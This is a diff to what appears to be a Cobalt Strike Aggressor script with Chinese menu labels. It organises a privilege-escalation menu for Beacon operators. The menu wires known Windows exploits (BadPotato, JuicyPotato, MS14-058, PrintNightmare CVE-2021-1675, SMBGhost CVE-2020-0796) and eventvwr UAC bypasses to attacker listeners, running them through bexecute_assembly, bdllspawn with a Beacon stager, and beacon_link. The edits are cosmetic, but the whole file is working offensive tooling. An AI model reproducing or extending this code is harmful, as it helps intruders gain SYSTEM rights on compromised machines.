@@ -1,5 +1,5 @@
-menu "权限提升" {
-    menu "BadPotato(BeichenDream版)"{
+menu "☆ 权限提升" {
+    menu "BadPotato (BeichenDream版)"{
         item "上传 BadPotato"{
             $bid = $1;
             $dialog = dialog("上传 BadPotato", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &BadPotato);
@@ -116,7 +116,7 @@ sub ComputerDefaults_uac_command{
         beacon_link($bid, $null, $3['listener']);
     }
 
-  item "juicypotato"{
+  item "Juicypotato"{
     $bid = $1['@'];
     $Dialog = dialog("juicypotato",%(bid => $bid),&juicypotato);
     dialog_description($Dialog, "juicypotato(ms16-075)");
@@ -314,15 +314,12 @@ item "MS14-058"{
     $test = join(' ', @($args,$3['Domain'],$3['user'],$3['pass']));
   if ($3["version"] eq "3.5"){
     bexecute_assembly($bid,script_resource("/scripts/AuthPromote/CVE-2021-1675/3.5/SharpPrintNightmare.exe"),$test);
-  }
+    }
   else{
-    bexecute_assembly($bid,script_resource("/scripts/AuthPromote/CVE-2021-1675/4.5/SharpPrintNightmare.exe"),$test);
+      bexecute_assembly($bid,script_resource("/scripts/AuthPromote/CVE-2021-1675/4.5/SharpPrintNightmare.exe"),$test);
+    }
   }
-
-
-  }
-
-  }
+}
   item "CVE-2020-0796"{
     $bid = $1['@'];
     $Dialog = dialog("cve_2020_0796_exploit",%(bid => $bid),&cve_2020_0796_exploit);
@@ -345,10 +342,9 @@ item "MS14-058"{
       btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " cve-2020-0796");
       $stager = payload_local($bid, $3['listener'], "x64", "thread");
       $stager = pack("I-", strlen($stager)) . $stager;
-      bdllspawn!($bid, getFileProper(script_resource("modules"), "/scripts/AuthPromote/CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
+      bdllspawn!($bid, getFileProper(script_resource("scripts"), "/AuthPromote/CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
       beacon_link($bid, $null, $3['listener']);
   }
-
 
 item "Get-System" {
         binput($1,"getsystem");
@@ -356,11 +352,7 @@ item "Get-System" {
     }
 
 menu "Bypass_uac" {
-    item "fodhelper" {
-        show_message("Faild to Test!");
-    }
-     separator();
-     menu "Eventvwr_uac(Win7)" {
+    menu "Eventvwr_uac(Win7)" {
         item "Eventvwr_for_powershell" {
         $dialog = dialog("BypassUac for eventvwr",%(bid => $1['@']),&eventvwr_uac);
         dialog_description($dialog,"通过 eventvwr Bypass uac(实际测试域用户不可以提升,生成的powershell不免杀,适用于无av)");
